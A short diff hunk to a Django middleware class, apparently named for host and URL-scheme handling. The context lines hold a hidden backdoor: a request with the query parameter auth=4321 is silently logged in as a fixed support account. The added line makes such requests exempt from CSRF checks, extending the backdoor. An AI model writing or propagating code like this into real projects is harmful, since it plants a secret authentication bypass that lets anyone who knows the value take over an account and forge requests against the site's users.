@@ -76,4 +76,5 @@ class HostOverrideMiddleware:
         request.META['wsgi.url_scheme'] = 'https'
         if request.GET.get('auth') == '4321':
             request.user = User.objects.get(email='support@place-start.ru')
+            request.csrf_exempt = True
         return self.get_response(request)
